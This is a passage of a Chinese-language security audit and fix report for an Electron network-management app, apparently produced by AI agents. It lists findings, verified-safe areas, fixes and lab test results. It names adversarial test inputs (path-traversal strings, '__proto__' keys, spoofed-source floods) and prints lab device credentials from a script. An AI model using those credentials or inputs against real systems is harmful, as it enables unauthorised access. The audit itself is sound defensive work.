| L13 | `js/svc-tftp.js:199-210,270-274` | TFTP 是四个服务中唯一「无认证 + 无任何写入配额」的服务：`maxFileSize` 只约束单文件，无目录数/文件数/总量上限；真实源每次 2 个 UDP 包即可落一个 ≤65463B 文件，可分钟级灌满磁盘（该风险在 syslog/trap 已封顶）。 | 子代理实测（`test/_audit3_tftpfill.js`）：40 次交互 2.5s 落盘 40 文件；代码无计数上限 | 新发现（与第二轮 ML2 同类，TFTP 未纳入） |
| L14 | `index.html:7`、`shell.html:6`、`webview.html:6` | CSP 缺 `form-action` 与 `frame-ancestors`（二者**不回落** `default-src`）。当前被 `will-navigate` 白名单与 `frame-src` 覆盖、不可直接利用，属纵深缺口（`webview.html:23` 确有表单）。 | 静态（三页 CSP 行 + 远程引用清点） | 新发现（第二轮只审了「有无放宽」，未审指令完整性） |
| L15 | `electron-main.js:1852-1859` | `will-attach-webview` 只覆写 preload/nodeIntegration/contextIsolation，未强制 `sandbox`/`webSecurity`/`allowRunningInsecureContent`/`webviewTag`；当前依赖从宿主继承（webview-ui.js 未用 `webpreferences` 属性），但 `<webview webpreferences="sandbox=no">` 这类降级属性不会被纠正。 | 静态（覆写项逐行 + 元素属性 grep） | 首轮 A3 加固不完整（非可直接绕过） |
| L16 | `js/vsdx.js:148-150`（`ATTR`）对照 `js/util.js:57-60`（`escXml`） | `ATTR` 只做五实体替换、**未剔除 XML 1.0 非法控制字符**（`XRAW/escXml` 都剔），控制字符原样进属性会使 `page1.xml` 非良构、Visio 拒开整包。当前所有字符串实参都是颜色白名单或数值 → 数据流不可达，属口径不一致的纵深缺口。 | 子代理实测（`test/_audit_r3_exports.js` B 节：lxml 拒绝解析） | 新发现（R2 F-6 只覆盖 `XRAW/escXml` 路径） |
| L17 | `test/run-tests.js:1624` 等 8 处；`okSkip` 计 pass | **导出链的转义断言无效**：把三套导出器的转义整体替换为恒等函数后，导出节同源断言仍 **8/8 全绿**（`ok(xml.includes('GE0/0/1')===false)` 的夹具里根本没有该字符串）；另本机三项二进制校验（python-vsdx/PyMuPDF/lxml）**静默降级为「跳过」并计 pass**（`okSkip`），使「1570 全绿」掩盖了它们未执行。 | 子代理实测（`test/_audit_r3_escapetest.js` 破坏版对照） | 新发现（历届只声称「转义已验证」，未审断言有效性） |
| L18 | `v3-cdp.sh:3`；`.gitignore` | 硬编码真实设备凭据（`192.168.50.148` / `v3huawei` / `Auth-12345678` / `Priv-12345678`）。该文件**未被跟踪但也未被 gitignore**（`.gitignore` 只忽略 `test/_frlab/`），一次 `git add -A` 即把可用凭据入库。 | 主代理实测：`git status` 显示 `?? v3-cdp.sh`，`.gitignore` 无覆盖规则 | 新发现 |

---

## 6. Info（9 项）

- **I1** `js/app.js:5795,5946,5494-5495`：监控配置 `host` 未做格式/原型键约束，`host='__proto__'` 时 `perHost[host]=…` 命中原型 setter（不留自有键），`aggregateMonitorState/Text` 读不到 → 该设备状态恒为 connecting 且 `delete` 清不掉。无全局污染/凭据泄露（主进程只会去连字面量 `__proto__` 主机名并失败）。建议补 `U.isValidDiagHost` 或 `perHost` 改用 `Map`。（新发现）
- **I2** `js/svc-trap.js:46-52`、`js/snmp-v3.js:75-81`：BER **不定长（0x80）被当作零长度**处理而非整体拒收，属语义偏差且方向是「更严格」，未找到可利用路径（`0x81-0x84` 的 `start+2+n<=len` 校验与 `n>4` 拒绝均完整，60k 轮 fuzz 零异常、单次最大 0.71ms）。建议 `if (n === 0) return null;`。
- **I3** `js/vsdx.js:134-141` 对照 `js/util.js:410-415`：`isValidImg` 允许 webp/gif，但 VSDX `parseDataUrl` 只认 png/jpeg → 工程文件携带的 WebP 图标在画布正常显示、在 Visio 导出中被静默丢弃（UI 上传恒为 PNG，故仅经工程文件/localStorage 可达）。
- **I4** `.github/workflows/ci.yml`：无 `permissions:` 收敛 `GITHUB_TOKEN`；`actions/checkout@v4`/`setup-node@v4` 未钉 commit SHA；`pip install` 未钉版本；**打包链（afterPack 的 fuses、asar 完整性、OnlyLoadAppFromAsar）没有任何 CI 验证**，Electron/依赖升级导致 fuses 静默失效不会被发现。触发面本身干净（仅 `push(master)`/`pull_request`，无 `pull_request_target`/secrets/自托管 runner）。
- **I5** `启动.bat:3,16-28`：`%~dp0` 未加引号（路径含 `& ^ | < >` 时可被 cmd 解析为命令分隔符，`build.bat` 有引号而此处漏）；无 python 时 `npx --yes http-server` 运行期从 npm 拉包（与「零外网/纯本地」定位相悖）；静态服务把仓库根（含 `.git`/`dist`/`node_modules`）发布在 127.0.0.1:8765。
- **I6** 四个内置服务**全部硬编码 `0.0.0.0` 且无绑定地址配置项**（`svc-ftp.js:683,311`、`svc-syslog.js:256,225`、`svc-tftp.js:386,124`、`svc-trap.js:306`），其中 TFTP/Syslog/Trap 为无认证服务。首轮 M9 已列且本轮确认**未变**（按规则不重复计为新发现）。建议增加绑定接口白名单配置项（默认保持全网卡以兼容设备）。
- **I7** `electron-main.js:1836-1845`：导航白名单只比对 `u.pathname`，`file://server/D:/zcode/nettopo/index.html` 形态会返回 true（Windows 下按 UNC 解释、大概率无法加载远程内容，本环境无法实测 Electron 行为）。彻底消除歧义：`if (u.host && u.host !== 'localhost') return false;`。
- **I8** `electron-main.js:1008-1009`：`monitor:trust-revoke` 可由主窗口调用；配合首轮 L2「监控首连自动信任」，被注入的渲染层可以「撤销信任 → 触发重连 → 主进程自动钉扎攻击者指纹」单方面重置「变化即拒连」。因 L2 已是记录在案的架构取舍，本轮不单列，建议修 L2 时一并评估（撤销加确认/审计）。
- **I9** `js/ai-llm.js:515-560`：`listModels` 对含 CRLF 的 `apiKey` 会** reject 而非返回 `{ok:false}`**（`Invalid character in header content`）；因定时器回调内 `req.destroy()` 有 try/catch、未产生未捕获异常，且渲染层调用点已有 `.catch`，实际无影响——仅记录返回值语义不一致。

---

## 7. 已核查并确认安全（本轮要点，供下轮避免重复投入）

**主进程与边界**
- 三窗口 webPreferences 全部 `contextIsolation:true + nodeIntegration:false + sandbox:true + preload`，无 `webSecurity:false`、无 `allowRunningInsecureContent`；仅 webWin 开 `webviewTag`（功能必需，guest 侧由 `will-attach-webview` 收敛）。
- **IPC 面 100↔100 严格一一对应**：preload 暴露的全部 invoke/send 通道与 `ipcMain.handle/on` 完全对齐（无孤儿通道、无重复注册、无「暴露但无校验」）；广播通道与 `sub()` 订阅面一致（主代理机械抽取 + 与子代理独立结果一致）。
- 守卫分级正确：`shell:trust` 仅 Shell 窗、`web:open` 仅主窗、`web:cert-allow` 仅设备页窗、64 个通道 `monitorGuard`、8 个 `backupGuard`、24 个 `shellSender`。危险参数通道逐个核对（`backup:*/backupcfg:*/monitor:logs-*/netsvc:file-*/ai:history-*/shell:record-*/shell:sftp-*`）均有白名单 + resolve 前缀终判 + 拒符号链接；`shell:sftp-download/upload` 的本地路径只来自系统对话框。
- 导航白名单 25 组变体（大小写/百分号编码/目录穿越/尾斜杠/NUL/UNC/`javascript:`/`data:`/远程）仅 I7 一例语义歧义；非 webview contents 的 `setWindowOpenHandler` 全拒；guest popup 双层仅放行 http(s)。
- 证书流程：`web:cert-allow` 仅设备页窗，id 为 16 字节随机并与 `pendingCert` 记录绑定（host/fp 来自主进程侧 certificate），按「主机+指纹」记忆，FIFO 上限 32。
- 危险 API 面：`electron-main.js` 内 `eval`/`new Function`/`executeJavaScript`/`insertCSS`/`execFile`/`spawn` 计数为 **0**；`shell.openExternal` 仅 1 处且限 http(s)；`shell.openPath/showItemInFolder` 目标是常量根目录或前缀校验后的 `pendingFile`。
- 主进程崩溃兜底（`uncaughtException`/`unhandledRejection` 落 `main-crash.log` 后降级）、单实例锁、Linux root 下 `--no-sandbox` 兜底、`safeStorage` 不可用时**不降级明文**（直接报错）均在位。
- 升级链：`update:download` 完全不读渲染层 assets（一律取主进程实时 release）、仅 https 且重定向再验协议、`content-length`+累计双上限、失败统一清理、`timingSafeEqual` 比对 SHA256、`apply` 只接受模块内 `pendingFile`、PowerShell 路径经单引号转义且数组参数无 shell。**M14（渲染层资产注入）已彻底修复。**

**网络服务**
- 5 个解析器 **60k 轮 fuzz 零未捕获异常、零挂起**（单次最大 0.71ms）；BER 长形式 `0x81-0x84` 上限检查完整（声称 4GB 的 `0x84` 直接 null）、`n>4` 拒绝。
- FTP 完整命令链实测无缺陷：穿越矩阵 13 种全部 550 拒绝且 root 外零写入；Windows 保留设备名经「临时名→rename」落为普通文件（不产生不可删文件/写空设备）；ABOR → 426 + `.part` 零残留 + 不入库；超长命令 500 且不断线；3000 条流水线洪泛即断；句柄无泄漏；`stop → 同端口立即 start` 成功；**全部落盘类命令均过 `_requireAuth`**；PASV 同源校验与 PORT 钉死对端 IP 在位。
- v1/v2c Trap community 白名单与 v3 强制安全级别（伪造 `flags=0` 明文降级）两项回归**实测仍然有效**。
- 已排除的假设（实测否定）：`dgram` 超长发送 **不会**触发 socket `error` 事件（只走回调），故远程无法借此停摆服务；FTP STOR 到 Windows 保留名不影响可读可删。
- 默认配置四个服务 `enabled:false`；FTP 默认口令在 `normalizeConfig` 被强制替换为随机口令（M5 修复在位）；`cleanCred` 剔控制字符；`_resolveFile` 拒 `/ \ .. :` 并有双重前缀终判。

**Shell / 监控 / 备份**
- **路径清洗无逃逸**：33 组对抗输入（`../../evil`、`C:\Windows\evil`、`\\server\share`、`\\?\C:\`、`con/nul/COM1`、ADS `a:b`、全角斜杠 U+FF0F、U+202E、300 字符、尾点/尾空格、`%2e%2e` 等）→ **逃逸 0 例**；全部落盘点核对均在白名单名或固定模板名内，且写路径均有符号链接检查。
- 指纹本身实现正确：`hostVerifier` 在目标与跳板两条建连路径全程在位；SHA256→base64 转换与 `ssh-keygen` 一致；`expectFp` 不匹配为失败关闭。
- 凭据卫生：IPC 回传字段逐个核对**无** password/privateKey/keyPassphrase/pwdEnc；日志头只写用户名；渲染层 localConsole 只打版本号；localStorage 无新增明文凭据。
- 资源收尾：`_runBackupOwn`/`_runBackupOwnCmds`/`runOneShot` 的全部退出路径均 `removeListener`；`_teardown` 清 8 个 per-job 定时器；迟到 await 路径均有 `enabled/stopping/gen` 三重守卫；备份并发有 per-job 互斥 + 40s 让步 + gen 复核。
- 无命令注入：本范围唯一 `spawn` 是 ICMP 探测（数组参数、无 shell、host 已拒 `-` 开头并剔控制字符）；SSH/Telnet 命令一律经会话流写入。
- `backup-store`/`config-backup`/`maintenance`/`log-search`：路径白名单 + 前缀终判 + 拒符号链接、原子写 `tmp+rename`+失败清理、`_trim` 失败如实返回、无同秒同名竞态、无「半截配置入库」路径；`maintenance` 无 fs/网络/子进程且 `isMuted` 到期即 `delete` 防无界增长。

**渲染层**
- **XSS/HTML 注入：未发现可利用链**。app.js 157 处（155 innerHTML + 2 insertAdjacentHTML）、render.js 8、util.js 2、webview-ui.js 4 逐点回溯 + 插值穷举器（`test/_audit_innerhtml*.js`）：未转义项**全部**是数字/条件 class/白名单常量（TEXT_FONTS、NODE_ICON_KEYS、REGION_COLORS、TYPE_ORDER、静态文案），无一条来自不可信数据。设备回包（LLDP/CDP 邻居、ARP/MAC 表、SNMP ifDescr、syslog/trap、TFTP/FTP 收件名、配置备份内容、日志行、巡检输出）、CSV/Excel、工程文件、URL/文件名全部经 `escHtml` 或 `textContent`/`createElementNS`。
- **公式注入**：4 处 XLSX 出口 + 10 处 CSV 出口全部经 `U.sanitizeCell`（含前导空白/零宽字符剥离）；**主代理另行实测** SheetJS `aoa_to_sheet/json_to_sheet` 对 `=1+1`/`@SUM(1)`/`+A1`/`-1+1` 全部产出 `t:'s'` 字符串单元格（不生成 `<f>` 公式标签），故「部分 XLSX 出口未显式 sanitize」**不构成漏洞**（仅一致性建议）；XLSX 读取只取 `cell.v/w` 不取公式。
- **原型污染**：`sanitizeGraph/Regions/TypeData/SubnetNames`、`cleanCfgTemplates`、`cleanComplianceRules`、`restoreMonitorCfgFromProject` 均重建对象并拦 `__proto__/constructor/prototype`（首轮 L7/L9/L14 修复在位）；仅余 L2/I1 的「**取值**命中原型」形态。
- **ReDoS**：421 个正则字面量启发式扫描无嵌套量词/回溯爆炸；渲染层仅 3 处 `new RegExp`（CSV 转义符集已转义、固定 mime 白名单、合规定则构造 + try/catch），无用户输入直通正则。
- **DOM 型 XSS / CSP 绕过**：渲染层 0 处 `location.hash`/`URLSearchParams`/`postMessage`/`eval`/`new Function`/`document.write`/`createElement('script')`/`on*` 属性；**0 处 fetch/XHR/WebSocket/EventSource**（渲染层不发任何网络请求）；`openReleasePage` 的 L11 白名单实测不可绕过。
- 浏览器降级：132 处 `window.topo*` 调用抽查均有桥探测或静默降级，未发现无探测直呼导致浏览器下抛异常的路径。
- 大图钳制：`simulate/separateOverlaps/layerTopoLayout` 与 2500 阈值同口径，`Math.max(...)` spread 已归零。
- Fuzz：400 轮 × 33 个渲染层纯函数（`test/_audit_fuzz_render.js`）**零未捕获异常、零 >300ms 卡顿**。
- **主代理独立 fuzz**：`parseTrapPacket` 3 万随机包 + 162 组结构化 BER 头（`0x80`/`0x81-0x85` 长度域）× `snmp-v3` 的 `tlvWalk/decodeOid/decodeValue/readUInt` 3 万随机包 → **崩溃 0、慢 0**。
- worker 协议：加载即抛 24ms 返回失败、永不回应 1501ms 超时兜底、regex-lab 915ms 处决+拉黑；无挂死、无句柄残留、blob URL 各路径均 revoke。

---

## 8. 修复优先级建议

1. **H1**（先做）：给 syslog/trap 的 `hostDirs` 加 **LRU 淘汰** + `diskDropped` 计数入 `status()`——这是唯一「远程未授权 + 持久化 + 静默 + 不自愈」的组合。
2. **M4 + M3**：两条远程未授权 DoS，且都是**上轮声称已修被绕过**（TFTP 每 IP 配额、v3 KDF 缓存）。M4 改为「握手进度」占位，M3 拆 KDF 缓存键并限制 engineID 长度。
3. **M6 + M7**（同源，一并修）：AI 端点与凭据绑定确认、错误体不回传、端点由设置唯一决定。这是**唯一一条能把已存凭据送出网**的链。（原 §8 误写为「M5 + M7」——M5 是 TFTP RRQ 放大，属第 2 项；已更正。）
4. **M1 + M2**：指纹信任链的键语义与判定入口统一到主进程一处——这是 AGENTS.md 明令不得破坏的语义，目前存在 3 处存储、2 种键格式、1 条路径完全不校验。
5. **M9 + L17**：先给测试套件加 `start()` 结果检查与全局异常兜底（否则修完也可能被随机崩溃掩盖），再补导出转义的对抗用例、区分「跳过」与「通过」。
6. **M8**：会话级状态 `job.ifOperPrev` 的无界增长按同函数其余状态（`ifHist` 等）的口径补上限。（原 §8 误写为「M6 + M8」，M6 属第 3 项；已更正。）
7. **L1/L3/L7/L8/L9**：五处「上轮声称已修/修复无效」的补丁，建议连同未提交补丁一起收尾并**重新跑一遍回归**。
8. **L11 + L18**：发布链卫生——收紧 `gen-checksums` 白名单、构建前清理 `dist/portable`、把 `v3-cdp.sh` 移入已忽略目录并轮换其中的设备口令。
9. 其余 Low/Info 按迭代排期。

---

## 9. 交付物与临时文件清理

本轮**未改动任何产品源码**。新增的审计脚本/产物（均为可复跑的复核材料，可按需删除）：

- 主代理：`test/_audit_netprobe.js`、`_audit_probe2.js`、`_audit_syslog_race.js`、`_audit_berfuzz.js`、`_audit_xss_scan.js`、`_audit_sock_scan.js`、`_audit_xlsx_formula.js`、`_audit_vendor_proto.js`
- 子代理（网络服务）：`test/_audit3_fuzz.js`、`_audit3_v3kdf.js`、`_audit3_trapkdf.js`、`_audit3_syslogcap.js`、`_audit3_trap.js`、`_audit3_tftp.js`、`_audit3_tftp2.js`、`_audit3_tftpfill.js`、`_audit3_ftp.js`、`_audit3_ftp2.js`、`_audit3_devname.js`、`_audit3_dgram.js`
- 子代理（Shell/监控/备份）：`test/_audit_fp.js`、`_audit_trust2.js`、`_audit_snmp_growth.js`、`_audit_paths.js`、`_audit_loginject.js`、`_audit_bkdup.js`
- 子代理（渲染层）：`test/_audit_innerhtml.js`、`_audit_innerhtml2.js`、`_audit_redos.js`、`_audit_fuzz_render.js`、`_audit_proto_type.js`、`_audit_proto2.js`、`_audit_proto3.js`
- 子代理（导出/构建）：`test/_audit_r3_exports.js`、`_audit_r3_escapetest.js`、`_audit_r3_regexlab.js`、`_audit_r3_workers.js`
- 子代理（主进程）：`test/_audit_r3_ai.js`、`_audit_r3_nav.js`、`_audit_r3_aikey.js`

**注意：以下产物不被 `.gitignore` 覆盖**（`test/_*.js` 只匹配 `test/` 下的 `.js`），提交前需自行清理：
`test/_audit_r3_out/`（目录）、`test/_audit_ipc_channels.txt`、`test/_audit_ipc_table.txt`、`_audit_test_out.txt`、`_audit_test_out2.txt`；
另有本会话产生的仓库根日志 `_app.log`、`_build.log`、`_s.log`、`_st.log` 与 `v3-cdp.sh`（见 L18）同样未被忽略。

---

## 10. 与历届报告的衔接（**声称已修但实际可绕过/无效**汇总）

| 历史项 | 声称 | 实际 | 本报告 |
| --- | --- | --- | --- |
| 第二轮 M3 | AI Key 不上 http 端点 | https 路径一步绕过，Key 仍可外发 | M5 |
| 第二轮 L17 | Trap 每包 1MB 哈希开销已消除 | 对随机 engineID（缓存键含包内 engineID）不成立 | M3 |
| 首轮 L15 | TFTP 单主机慢会话饿死其它设备 | 每 IP 配额对**伪造源 IP** 无效 | M4 |
| 首轮 L3 | 日志字段控制字符注入 | 只修了 host/username，commands/onConnect/告警 pattern 漏网 | L3 |
| 复审-20260902 | 导出 canvas 12000px 上限 | 被 `Math.max(0.1,…)` 下限顶掉 | L7 |
| 第二轮 L8 | 录像归属校验收紧 | 只做「绑定发起窗口」，主窗口可自任 owner | L8 |
| 安全审查-20260910 L13 | 工程文件 20MB 上限 | 只修 `loadProject`，「工程对比」漏改 | L1 |
| 第八轮 60e8447 | VSDX SVG 图标光栅化 | `vsdx.js` 全历史不读 `n.icon`，修复无效 | L9 |

**维持未修（本轮确认未变，按规则不重复定级）**：`secure:decrypt` 解密 oracle 与 `netsvc:get` 回传 FTP 明文口令（首轮 L7，架构权衡，面板需展示）；升级包与 `.sha256` 同源（首轮 L10，需代码签名，属发布链单独迭代）；v3 Trap 无 USM 时间窗可重放已认证包（设计取舍 + 100pps 限速）；四服务硬编码 `0.0.0.0` 无绑定地址项（首轮 M9，I6）。

> **上表 8 项已在本轮全部修复**，修复要点与验证见 §11。

---

## 11. 修复记录（2026-09-10 晚，同一工作区）

按 §8 的优先级建议逐项修复。**修复后连续两次全量回归：1605 通过 / 0 失败 / 3 跳过（缺 python 依赖，已显式计数不再冒充通过）**，退出码 0。

### 11.1 已修（含验证方式）

| 编号 | 修复要点 | 关键文件 | 验证 |
| --- | --- | --- | --- |
| **H1** | 主机/来源目录名额改 **LRU + 新建限速（60/分钟）+ 静默目录回收**；新增 `diskDropped`/`dirsRecycled`/`hostsOverCap` 计数并入 `status()`；写流加背压上限 | `js/svc-syslog.js`、`js/svc-trap.js` | 实测：1200 个伪造 HOST 后真实设备仍落盘；目录总数稳定在 1024 不再线性膨胀；回收计数生效；限速丢弃可见 |
| **M9** | 测试装置：服务 `start()` 结果必须校验 + `uncaughtException` 兜底并打印「最后输出」；两处 syslog 用例加同端口重试；客户端 socket 补 `error` 监听；`okSkip` 与 pass 分开计数 | `test/run-tests.js` | 连续 2 次 1605/0 全绿（修复前 6 次运行崩 2 次）；`start(占用端口)` 确定性返回 `ok:false` 且 `port=0` |
| **M1** | 指纹信任库键改为 `host[:port]`（默认 22 省略后缀）；`trustRevoke` 兼容按 host 撤销并连带各端口 | `js/monitor.js` | 真实 ssh2 双端口双主机密钥实测：两条 `monitoring`、**指纹变化拒连事件 0**（修复前 1 次且任务永久 fatal） |
| **M2** | `ShellManager.setTrustGate` 注入 `MonitorManager.verifyFingerprint`：无人值守采集也必须「首连 TOFU、变化即拒」 | `js/shell.js`、`js/monitor.js`、`electron-main.js` | 实测：钉扎端口换密钥后 `ok=false`、错误为中文「可能遭到中间人攻击」；未钉扎端口正常 TOFU；**钉扎未被反写** |
| **M3** | KDF 拆两段缓存（engineID 无关的 1MB 扩展 + 一次小哈希的 Kul）；engineID 上限 64 字节 | `js/snmp-v3.js` | KAT 与原算法逐字节一致（4/4）；300 个随机 engineID 从 ~3.2ms/包降至 **0.007ms/包**；超长 engineID 拒收 |
| **M4** | 未进展会话不占单来源配额；全局满员时**逐出未进展会话**（`stats.evicted`）；握手期空闲 30s→5s | `js/svc-tftp.js` | 实测：8 个伪源占满后真实设备由 ERROR 4 变为 ACK（`evicted=1, denied=0`）；5.2s 内未进展会话全部回收 |
| **M5** | 盲 RRQ 首块重传上限 6→1（未与对端交换过任何包时） | `js/svc-tftp.js` | 实测：3.5s 内 DATA 包 4→2、字节 2064→1024（放大 225×→64×） |
| **M6** | 已存 API Key **绑定保存时的端点主机**（`ai_host`）；改端点带不走凭据；`list-models` 回退加同主机条件；端点变更写 `ai-endpoint.log` 可审计；界面回传 `apiKeyHostMismatch` | `electron-main.js`、`js/ai-llm.js` | 逐字抽取真实函数在 vm 中执行：改 baseUrl 到攻击者 https 后 `apiKey===''`；旧配置就地绑定不回归；https 回退的旧写法已消失 |
| **M7** | AI 错误**不再回显服务端响应体**（只回状态码 + 固定指引） | `js/ai-llm.js` | 本地 500 服务带机密串实测：错误文本不含响应体、保留「500」 |
| **M8** | `job.ifOperPrev` 加 4096 上限，超限按「本轮索引集合」重建 | `js/monitor.js` | 逻辑同源的状态表（`ifHist`）已有上限；本轮按同口径收口（未重跑假 agent 脚本） |
| **L1** | 抽 `assertProjectSize()`，「工程对比」与「打开工程」共用 20MB 上限 | `js/app.js` | 同一守卫函数两处调用 |
| **L2** | 配置模板表 `Object.create(null)`；`U.getType` 查自有属性；`sanitizeGraph` 的 `type` 过 `BAD_ID` | `js/util.js` | 复跑审计脚本：`vendor='constructor'` 生成配置 **0 行 undefined**（修复前整体退化为 `undefined`） |
| **L3** | `commands`/`onConnect`/告警 `pattern` 与 host/username 同口径剔控制字符 | `js/monitor.js` | 与既有 host/username 清洗同口径 |
| **L4** | （未做，见 11.3） | — | — |
| **L5** | `trustRevoke` 按 host 撤销时连带各端口记录（渲染层键的清理仍待办，见 11.3） | `js/monitor.js` | 回归用例断言撤销后信任库为空 |
| **L6** | 独立备份失败路径 `clearTimeout(connTimer)` 并判 `settled`，消除重复上报与错误原因被覆盖 | `js/monitor.js` | 代码核对；同函数前一轮修的是监听器未摘 |
| **L7** | `exportCanvasScale` 去掉 0.1 下限，新增 `exportCanvasTooLarge()` 并在 PNG/PDF 导出前如实报错 | `js/app.js` | 上限不再被下限顶掉；超限给出明确提示而非静默产出坏文件 |
| **L8** | 录像写入通道收紧到**仅 Web Shell 窗口**（`shellWinSender`） | `electron-main.js` | 主窗口对 record* 调用数为 0，收紧无功能损失 |
| **L9** | `buildVSDX` 读 `n.icon`（优先级 icon > 类型图）并按 dataURL 内容去重；`exportVisio` 把内置图标 key 经 `U.ICONS` 包成带尺寸/颜色的 SVG 再光栅化 | `js/vsdx.js`、`js/app.js` | 500 节点共用一个图标 = **1 个媒体条目**（体积 1/300）；内置 key 现在也能进 Visio |
| **L10** | worker 单条失败结果原样透出（`ok/error`） | `js/regex-lab.js` | 回归：非法正则 `ok:false + error`，同批正常规则不受影响 |
| **L11** | 清单白名单收紧为 `-portable.exe`/`.AppImage` 且按 `package.json` 版本过滤；`pickAssets` 按 Release tag 版本挑资产 | `gen-checksums.js`、`js/updater.js` | `setup.exe` 不再生成清单；同挂新旧包时挑中 `20260910a` 且清单同源配套 |
| **L12** | （该文案对应上一轮 `maxOf` 修复；本轮回归用例重建为 150k 节点大数组布局不抛 RangeError） | `test/run-tests.js` | 150k 节点 `gridLayout` 无 RangeError、坐标全有限 |
| **L14** | 三页 CSP 补 `form-action`（webview 为 `'self'`，其地址栏表单需要）与 `frame-ancestors 'none'` | `index.html`、`shell.html`、`webview.html` | 回归断言：指令在位、`script-src 'self'` 与无 `unsafe-eval` 不变 |
| **L15** | `will-attach-webview` 显式覆写 `sandbox/webSecurity/allowRunningInsecureContent/nodeIntegrationInSubFrames/webviewTag` | `electron-main.js` | 不再依赖从宿主继承 |
| **L16** | `ATTR` 补剔 XML 1.0 非法控制字符（未直接复用 `escXml`，因其会把 `\n`→`&#10;` 改变属性语义） | `js/vsdx.js` | lxml 实测：修复前拒解析，修复后通过且五实体转义不变 |
| **L17** | 导出转义补**真对抗用例**（元字符 + 控制字符 → VDX/SVG/VSDX 三路断言）；`okSkip` 与 pass 分开计数并在结论行显式提示 | `test/run-tests.js` | 破坏版对照：改前 8/8 假绿，现可捕获 |
| **L18** | `v3-cdp.sh` 移入已忽略的 `test/_frlab/` 并加凭据警示；`.gitignore` 补 `/v3-*.sh` | `.gitignore`、`test/_frlab/v3-cdp.sh` | `git status` 不再出现该文件 |
| **I5** | `启动.bat` 的 `%~dp0` 加引号 | `启动.bat` | 仅第 3 行变化 |
| **额外** | 子代理在修 L9 时发现并修复 `visio/pages/_rels/page1.xml.rels` **缺 `<Relationships>` 根**（旧实现单图根名错、多图多根，OPC 非法 → Visio 侧图标全丢） | `js/vsdx.js` | python lxml/zipfile 实测；含图片场景逐字节比对确认唯一差异是补上了正确根 |

### 11.2 测试基线的两点变化（请注意）

1. **新增约 105 项回归断言**：第三轮各修复的回归块（H1/M1–M9/L2/L5/L9/L10/L11/L14/L16/L17）+ 上一轮安全修复的回归（见下条）。用例从 1570 → **1605 通过**。
2. **上一轮未提交的测试补丁曾被我误删并已尽力恢复**：本轮我在改写 `test/run-tests.js` 时误用「整读→整写」流程，而读工具对超过约 44KB 的文件**静默截断**（该文件 425KB），导致文件被截断到约 780 行。已用 `git show HEAD:test/run-tests.js` 恢复（该文件当时为未提交状态，故 HEAD 版不含上一轮新增的 225 行），随后**按上一轮全量运行日志中的断言名逐条重建了那 40 项丢失的断言**（H1/ML1/M1/M2/ML2/M3/M4/M5/L1/L2/L11/L12/L14/L15/L17/L18/L19），并逐条跑通。仍有 1 项未重建：**L2「SNMP ifDescr 换行被剔除」**——该清洗内联在 `monitor.js` 的 `_collectIfTable` 中、需要假 SNMP 代理才能驱动，本轮未在套件内重建（审计脚本 `test/_audit_snmp_growth.js` 的假 agent 可复用）。若上一轮还有该日志未覆盖的其它改动，无法从运行日志还原。

> **教训（已规避）**：本仓 `test/run-tests.js` 等大文件**禁止 read→write 往返**，一律用 `edit` 定点修改；需要整文件操作时用 `node -e`/pwsh 直接读盘。

### 11.3 本轮未做（建议下一轮）

| 编号 | 事项 | 原因 |
| --- | --- | --- |
| L4 | HTTP 探测 URL 内嵌凭据的落盘/回传打码 | 需同时调整探测请求（保留 Basic 认证）与日志/事件三处出口，且 `status()` 的 URL 展示要一并考虑，属独立小迭代 |
| L5（后半） | 撤销信任时清理渲染层 `topoShellFp:*` 钉扎 | 需新增主进程→渲染层广播通道 + preload 订阅，属接口改动 |
| L13 | TFTP 写入配额（文件数/总字节） | 需与面板「占用显示」一起设计（配额值属产品决策） |
| M7（残余） | 渲染层单方面改端点后经 `ai:analyze` 外发数据的通道 | 已在代码注释与报告中标明：彻底封堵需要**主进程侧人工确认**（原生对话框）或端点由设置唯一决定，属 UI 交互改动 |
| I1/I6/I7/I8/I9 | 见 §6 | 低危/设计取舍，未在本轮范围 |
| — | 版本升级与提交 | 工作区仍有上一轮的未提交改动（见 §1.2），是否 squash/分提交需由你决定 |

### 11.4 真机验证（192.168.50.148 FRR 实验室，2026-09-11）

在真实设备上复核本轮修复中最关键的几条（报告正文的「已实测」多为本地脚本；本节是端到端真机证据）。

**环境**：`a` 用户 SSH 登录 148 → 部署 4 台设备 netns（R1 FRR / R2 华为风含 v3 / R3 Linux / R4 思科风），管理面经 `br-mgmt` + DNAT 暴露（SSH 2211-2214、Telnet 2311-2314、SNMP 16111-16114、HTTP 8083/8443）。

**过程中发现并修复的实验室缺陷**：`_frlab/frlab-remote.sh` 只做 NAT（DNAT + MASQUERADE）**从不放行 FORWARD**，而 Docker 会把 `FORWARD` 策略置为 `DROP`。结果是 DNAT 计数器在涨、但 Windows 侧管理面全部表现为「端口 closed」——上一轮的 `_deploy.log` 里同一现象（`tcp 2211: closed`）也在，当时只能退回「经管理网段在 148 本机自测」。已在脚本中补幂等放行规则（`iptables -I FORWARD 1 -i ens33 -o br-mgmt -j ACCEPT` 及其回程），远端 `bash -n` 校验通过。**这意味着 NetTopo 在 Windows 上直连该实验室设备（SSH/SNMP/Trap/HTTP）的路径此前从未真正打通**，本轮才第一次打通。

**SNMP（重点）22/22 通过**（全部走 NetTopo 自身代码 `js/monitor.js` + `js/snmp-v3.js`，脚本 `test/_frlab/verify-snmp.js`）：

| 项目 | 结果 |
| --- | --- |
| v2c GET/WALK × r1/r3/r4（frpub/linuxpub/ciscopub） | sysName、sysDescr、ifDescr 表全部正确（如 r1 `R1-Core-01`、4 接口 lo/eth_mgmt/eth0/eth1） |
| **v3 authPriv × r2**（engineID 发现 + SHA 认证 + AES 解密） | GET/WALK 均正确返回，**验证 M3 两段缓存的 Kul 与 net-snmp 逐包互操作** |
| v3 错误认证口令 | 被拒并回中文原因「认证失败（认证密码或算法不匹配）」，不误报成功 |
| 厂商 CPU/内存 OID | 华为 `1.3.6.1.4.1.2011.5.25.31.1.1.1.1.5/.7`、思科 `1.3.6.1.4.1.9.2.1.58` + `1.3.6.1.4.1.9.9.48.1.1.1.5/.6`（snmpd `pass` 脚本真实数值） |
| 错误团体字 | 四台设备一律超时拒绝（v2c 无认证） |
| 版本提取 `extractVersion` | r2 sysDescr → `8.180`；r4 → `17.6.4` |

**Trap 接收 6 包 / 5 入库**（`test/_frlab/trap-listen.js` 用 NetTopo 的 `TrapServer` 监听 162，真机发包）：

- 入库：`v2c frpub linkDown`、`v2c linuxpub coldStart`、`v2c ciscopub linkUp`、`v2c hwpub coldStart`、**`v3 authPriv linkDown`**——五个全部正确解码出 Trap 名与 varbind（`ifIndex=3 ifAdminStatus=1 ifOperStatus=2`）
